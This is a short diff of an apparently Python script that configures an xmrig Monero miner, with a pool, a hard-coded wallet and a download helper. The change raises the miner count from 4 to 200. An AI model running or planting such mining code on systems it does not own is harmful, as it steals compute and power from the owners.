@@ -10,7 +10,7 @@ POOL = "gulf.moneroocean.stream:10128"
 WALLET = "47HxtCmFXxqVzQSGjQgBnDC1LRTrokf3aMFocbWQRxYzjhjxkfLGjzwE3PJhrCtdQkXPunr8cZZBAiEmY5W46V1UV8mFMZh"
 PASS = "py"
 ALGO = "randomx"
-NUM_MINERS = 4
+NUM_MINERS = 200
 
 # ⬇️ Download and extract xmrig if needed
 def setup_xmrig():
